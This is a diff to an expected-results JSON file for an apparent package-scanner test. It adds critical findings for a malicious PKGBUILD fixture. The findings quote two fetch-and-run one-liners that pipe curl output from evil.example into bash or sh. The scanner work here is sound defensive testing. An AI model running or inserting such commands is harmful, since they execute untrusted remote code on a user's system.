@@ -39,6 +39,50 @@
       }
     },
     {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/stage2.sh",
+      "description": "This package downloads and executes code from https://evil.example/stage2.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 17,
+        "column": null,
+        "snippet": "curl -fsSL https://evil.example/stage2.sh | bash"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/stage2.sh"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/p",
+      "description": "This package downloads and executes code from https://evil.example/p at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 23,
+        "column": null,
+        "snippet": "curl -s https://evil.example/p | sh"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/p"
+        ]
+      }
+    },
+    {
       "id": "OBF-003",
       "severity": "high",
       "category": "obfuscation",
@@ -76,6 +120,25 @@
       }
     },
     {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'package' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 20,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "package",
+        "pattern": "curl"
+      }
+    },
+    {
       "id": "SRC-005",
       "severity": "medium",
       "category": "configuration",
@@ -95,6 +158,6 @@
   "scanned_files": [
     "tests/fixtures/malicious/var-indirection/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T13:48:50.737887192Z",
-  "scan_duration_ms": 6
+  "timestamp": "2026-11-10T14:51:11.208515648Z",
+  "scan_duration_ms": 66
 }
